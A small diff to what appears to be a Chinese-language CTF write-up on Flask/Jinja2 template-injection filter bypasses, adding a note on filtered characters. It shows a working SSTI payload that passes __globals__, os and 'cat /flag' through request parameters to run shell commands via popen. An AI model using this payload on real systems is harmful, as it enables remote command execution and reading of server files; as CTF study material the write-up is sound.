@@ -221,7 +221,8 @@ cookie:a=__globals__;b=cat /flag
 
 ^
 ## **过滤OS**
-还是传参绕过
+过滤了单双引号、args、中括号l、下划线、os
+还是传参绕过。
 ```
 ?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag
 ```
